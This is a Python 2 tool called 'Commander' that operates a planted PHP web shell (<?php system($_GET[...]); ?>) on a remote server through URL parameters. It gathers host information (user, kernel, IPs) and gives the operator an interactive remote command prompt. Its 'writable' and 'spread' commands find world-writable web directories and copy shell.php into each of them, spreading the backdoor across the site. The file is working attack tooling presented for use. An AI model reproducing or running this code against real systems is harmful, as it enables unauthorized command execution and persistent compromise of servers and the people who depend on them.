#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

from sys import argv
from urllib2 import urlopen, quote, unquote, URLError, HTTPError
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to handle the shell environment'
else:
    pass

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'

class Commander(object):
    def __init__(self, url=None):
        self.url = url
        self.source = None
        self.info = None
        self.writeables = None
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')

    # defining static methods
    @staticmethod
    def banner():
        return """{0}
\t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
\t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
\t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
\t\t|  |      |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
\t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
\t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
\t\t--------------------------------------------------------------------------------------
        {1}""" .format(Colors.YELLOW, Colors.END)

    def ServerInfo(self):
        try:
            self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
            print Commander.banner()
        except HTTPError:
            print '\n[!] Invalid URL.'
            exit(1)
        try:
            local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            local_ip = 'Unknown'
        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
        self.info = \
        '''
        {dashed}
        {red}User{end}     :  {green}{current_user}{end}
        {red}ID{end}       :  {green}{current_id}{end}
        {red}Kernel{end}   :  {green}{kernel_info}{end}
        {red}CWD{end}      :  {green}{cwd}{end}
        {red}Host IPs{end} :  {green}{host_ip}{end}
        {red}Local IP{end} :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}.{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute it on your box.{end}
        '''.format(dashed='-'* int(len(source[2])+12),
                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                current_user=source[0],
                current_id=source[1],
                kernel_info=source[2],
                cwd=source[3],
                host_ip=', '.join(source[4:]),
                local_ip=local_ip,
                available_commands=available_commands,
                )
        print self.info

    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                try:
                    command = quote(raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=self.source[0],
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=self.source[4],
                        cwd=self.source[3])))
                except IndexError:
                    command = quote(raw_input('icommand@server:$ '))
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(quote(command)[1:], shell=True).wait()
                    elif command == 'info':
                        print self.info
                    elif command == 'banner':
                        print Commander.banner()
                    elif command == 'writable':
                        self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
                        self.writeables = writeables = map(str.strip, urlopen('{}{}'.format(self.url, self.cmd)).readlines())
                        c = 1
                        for path in writeables:
                            print '{0:2d}- {1}'.format(c, path)
                            c += 1
                    elif command == 'spread':
                        self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
                        urlopen('{}{}'.format(self.url, self.cmd))
                        print '[+] Successfully wrote shell.php to {} directory\n[+] Type writeable to check dirs'.format(len(self.writeables))
                    else:
                        source = urlopen('{}{}'.format(self.url, command)).read()
                        if source:
                            print source.rstrip()
                        else:
                            print '{}: command not found'.format(unquote(command))
                else:
                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                exit(1)
            i += 1

def main():
    if len(argv) != 2:
        print '\n[+] Usage : {0} Shell_URL\n[!] Example: {1} http://www.test.com/shell.php?cmd='.format((argv[0], )*2)
        exit(1)

    else:
        execute = Commander(str(argv[1]))
        execute.ServerInfo()
        execute.BackConnect()

if __name__ == '__main__':
    main()
